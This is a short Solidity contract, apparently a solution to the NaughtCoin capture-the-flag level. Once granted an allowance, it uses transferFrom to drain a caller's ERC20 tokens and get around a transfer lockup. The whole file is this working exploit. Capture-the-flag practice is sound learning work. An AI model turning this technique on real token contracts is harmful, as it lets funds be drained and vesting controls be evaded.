pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}


contract NaughtCoinAttacker {
    IERC20 public immutable victim;

    constructor(address _victim) {
        victim = IERC20(_victim);
    }

    function getAllowance() public view returns (uint256) {
        return victim.allowance(msg.sender, address(this));
    }

    function drainTokens(address to) public {
        uint256 balance = victim.allowance(msg.sender, address(this));
        require(balance > 0, "No allowance given");
        if (!victim.transferFrom(msg.sender, to, balance)) {
            revert();
        }
    }
}